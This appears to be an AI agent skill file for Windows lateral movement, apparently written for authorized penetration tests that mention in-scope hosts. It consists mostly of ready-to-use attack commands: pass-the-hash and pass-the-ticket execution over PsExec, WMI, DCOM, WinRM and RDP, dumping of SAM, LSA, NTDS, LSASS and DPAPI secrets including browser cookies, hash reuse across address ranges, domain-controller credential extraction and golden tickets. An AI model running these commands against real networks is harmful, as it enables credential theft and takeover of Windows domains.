---
name: windows-lateral
description: Windows lateral movement — PTH/PTT, PsExec, WMI, DCOM, scheduled tasks, WinRM, RDP, LSASS/SAM dump, DPAPI. Use when you have admin on a host or a reusable hash/ticket.
metadata:
  version: '1.0'
---

# Lateral movement

Admin on one host (or a hash/ticket that is admin somewhere). Reuse secrets; do not spray.

## Choose a channel

| Channel | Port | Command |
|---|---|---|
| SMB / SCM (PsExec) | 445 | `psexec.py '<domain>/<user>:<pass>@<ip>'` or `-hashes :<nt>` / `-k` |
| WMI | 135 + dynamic | `wmiexec.py ...` |
| DCOM | 135 | `dcomexec.py ...` |
| Task scheduler | 445 | `atexec.py ...` |
| WinRM | 5985/5986 | `evil-winrm -i <ip> -u <user> -p '<pass>'` / `-H <nt>` |
| RDP | 3389 | Restricted admin PTH: `xfreerdp /u:<user> /pth:<nt> /v:<ip>` |
| SSH | 22 | Only if OpenSSH is installed |

NetExec equivalents: `nxc smb <ip> -u ... -x 'whoami'`, `nxc winrm`, `nxc rdp`. `(Pwn3d!)` means local admin.

Prefer **WMI / WinRM** over PsExec (PsExec drops a service binary). Use `-k` when you have a TGT (`windows-kerberos`).

## Dump and reuse

```
nxc smb <ip> -u <user> -p '<pass>' --sam --lsa --ntds --dpapi
nxc smb <ip> -M lsassy
secretsdump.py '<domain>/<user>:<pass>@<ip>'
```

Reuse NT hashes with PTH on other in-scope hosts (`nxc smb <range> -u <user> -H <nt> --continue-on-success`). That is **hash reuse**, not a password spray.

Tickets: `export KRB5CCNAME=...` then `-k` everywhere.

## DPAPI / RDG / Chrome

From LSA/DPAPI blobs: `dpapi.py`, `donpapi`, browser cookies. RDP `.rdg` passwords. Record new creds as knowledge.

## Sessions

```
nxc smb <ip> --sessions
nxc smb <ip> --loggedon-users
```

A Domain Admin session on a workstation → wait or coerce LSASS (`windows-kerberos` unconstrained if the box is a server with delegation).

## RDP / Restricted Admin

PTH over RDP needs Restricted Admin or equivalent. NLA without valid creds will fail — don't brute RDP.

## After DA on a DC

`secretsdump -just-dc` / NTDS, then `windows-trusts` if other domains exist. Golden ticket only as optional proof (`windows-kerberos`).

## Extra

- **SCCM / WSUS / Intune** admin on a site server → deploy a proof script to clients (high impact; document, don't fleet-wide).
- **SQL links** (`windows-mssql`) as an alternate hop.
- **DCOM / MMC** when SMB is filtered but 135 is open.
